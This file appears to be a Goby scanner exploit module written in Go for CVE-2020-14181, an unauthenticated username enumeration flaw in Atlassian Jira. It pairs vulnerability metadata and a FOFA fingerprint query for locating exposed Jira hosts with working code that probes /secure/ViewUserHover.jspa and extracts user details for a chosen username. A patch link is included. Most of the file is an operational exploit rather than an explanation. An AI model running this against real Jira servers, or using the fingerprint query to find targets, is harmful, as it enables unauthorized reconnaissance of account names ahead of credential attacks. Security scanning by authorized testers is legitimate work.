package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Jira Unauthorized User traversal (CVE-2020-14181)",
    "Description": "JIRA unauthorized user name enumeration vulnerability",
    "Impact": "Jira Unauthorized User traversal (CVE-2020-14181)",
    "Recommendation": "<p>1. At present, the manufacturer has released an upgrade patch to fix the vulnerability. The link to get the patch: </p><p> <a href=\"https://jira.atlassian.com/browse/JRASERVER-71560\">https://jira.atlassian.com/browse/JRASERVER-71560</a> </p>",
    "Product": "JIRA",
    "VulType": [
        "Information Disclosure"
    ],
    "Tags": [
        "Information Disclosure",
        "2H1W"
    ],
    "Translation": {
        "CN": {
            "Name": "Atlassian Jira用户名枚举",
            "Description": "Atlassian Jira是澳大利亚Atlassian公司的一套缺陷跟踪管理系统。该系统主要用于对工作中各类问题、缺陷进行跟踪管理。受影响的Atlassian Jira Server和Data Center版本允许未经身份验证的用户通过/ViewUserHover.jspa端点中的信息泄露漏洞枚举用户。受影响的版本是7.13.6之前的版本，8.5.7之前的8.0.0版本和8.12.0之前的8.6.0版本。Jira 存在信息泄漏漏洞，攻击者可利用该漏洞枚举用户信息。",
            "Impact": "<p><span style=\"font-size: medium;\">Atlassian Jira是澳大利亚Atlassian公司的一套缺陷跟踪管理系统。该系统主要用于对工作中各类问题、缺陷进行跟踪管理。</span></p><p><span style=\"font-size: medium;\">受影响的Atlassian Jira Server和Data Center版本允许未经身份验证的用户通过/ViewUserHover.jspa端点中的信息泄露漏洞枚举用户。受影响的版本是7.13.6之前的版本，8.5.7之前的8.0.0版本和8.12.0之前的8.6.0版本。Jira 存在信息泄漏漏洞，<span style=\"color: rgb(23, 43, 77);\">受影响的Atlassian Jira Server和Data Center版本允许未经身份验证的用户通过/ViewUserHover.jspa端点中的信息泄露漏洞枚举用户。</span></span></p>",
            "Recommendation": "<p style=\"text-align: start;\">1、目前厂商已发布升级补丁以修复漏洞，补丁获取链接：</p><p style=\"text-align: start;\"><a target=\"_Blank\" href=\"https://jira.atlassian.com/browse/JRASERVER-71560\">https://jira.atlassian.com/browse/JRASERVER-71560</a></p>",
            "Product": "ATLASSIAN-JIRA",
            "VulType": [
                "信息泄露"
            ],
            "Tags": [
                "信息泄露",
                "两高一弱"
            ]
        },
        "EN": {
            "Name": "Jira Unauthorized User traversal (CVE-2020-14181)",
            "Description": "JIRA unauthorized user name enumeration vulnerability",
            "Impact": "Jira Unauthorized User traversal (CVE-2020-14181)",
            "Recommendation": "<p style=\"text-align: start;\">1. At present, the manufacturer has released an upgrade patch to fix the vulnerability. The link to get the patch: </p><p style=\"text-align: start;\"> <a target=\"_Blank\" href=\"https://jira.atlassian.com/browse/JRASERVER-71560\">https://jira.atlassian.com/browse/JRASERVER-71560</a> </p>",
            "Product": "JIRA",
            "VulType": [
                "Information Disclosure"
            ],
            "Tags": [
                "Information Disclosure",
                "2H1W"
            ]
        }
    },
    "FofaQuery": "(body=\"jira.webresources\" || header=\"atlassian.xsrf.token\" || body=\"ams-build-number\" || title=\"System Dashboard - \" || (body=\"content=\\\"JIRA\" &&  header!=\"boa\" && body!=\"Server: Boa\") || banner=\"atlassian.xsrf.token\") || body=\"jira.webresources\" || header=\"atlassian.xsrf.token\" || body=\"ams-build-number\" || body=\"com.atlassian.plugins\" || title=\"System Dashboard - \" || body=\"content=\\\"JIRA\"",
    "GobyQuery": "(body=\"jira.webresources\" || header=\"atlassian.xsrf.token\" || body=\"ams-build-number\" || title=\"System Dashboard - \" || (body=\"content=\\\"JIRA\" &&  header!=\"boa\" && body!=\"Server: Boa\") || banner=\"atlassian.xsrf.token\") || body=\"jira.webresources\" || header=\"atlassian.xsrf.token\" || body=\"ams-build-number\" || body=\"com.atlassian.plugins\" || title=\"System Dashboard - \" || body=\"content=\\\"JIRA\"",
    "Author": "1291904552@qq.com",
    "Homepage": "https://www.atlassian.com/software/jira",
    "DisclosureDate": "2020-10-21",
    "References": [
        "https://twitter.com/ptswarm/status/1318914772918767619"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "1",
    "CVSS": "6.0",
    "CVEIDs": [
        "CVE-2020-14181"
    ],
    "CNVD": [
        "CNVD-2020-52933"
    ],
    "CNNVD": [
        "CNNVD-202009-1072"
    ],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "username",
            "type": "input",
            "value": "admin",
            "show": ""
        }
    ],
    "ExpTips": {
        "type": "",
        "content": ""
    },
    "AttackSurfaces": {
        "Application": [
            "JIRA"
        ],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "9687"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			username := goutils.RandomHexString(5)
			uri_1 := "/secure/ViewUserHover.jspa?username=" + username
			cfg_1 := httpclient.NewGetRequestConfig(uri_1)
			cfg_1.VerifyTls = false
			if resp_1, err := httpclient.DoHttpRequest(u, cfg_1); err == nil {
				if resp_1.StatusCode == 200 && strings.Contains(resp_1.Utf8Html, username) && (strings.Contains(resp_1.Utf8Html, "用户不存在") || strings.Contains(resp_1.Utf8Html, "User does not exist")) {
					return true
				}
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			username := ss.Params["username"].(string)
			uri_1 := "/secure/ViewUserHover.jspa?username=" + username
			cfg_1 := httpclient.NewGetRequestConfig(uri_1)
			cfg_1.VerifyTls = false
			if resp_1, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg_1); err == nil {
				if resp_1.StatusCode == 200 {
					if result := regexp.MustCompile(`class="user-hover-details"((\n|.)*?)user-hover-buttons`).FindAllStringSubmatch(resp_1.Utf8Html, -1); len(result) == 1 {
						expResult.Output = result[0][1]
						expResult.Success = true
					} else {
						expResult.Output = fmt.Sprintf("\"user %s not exists\"", username)
						expResult.Success = true
					}
				}
			}
			return expResult
		},
	))
}
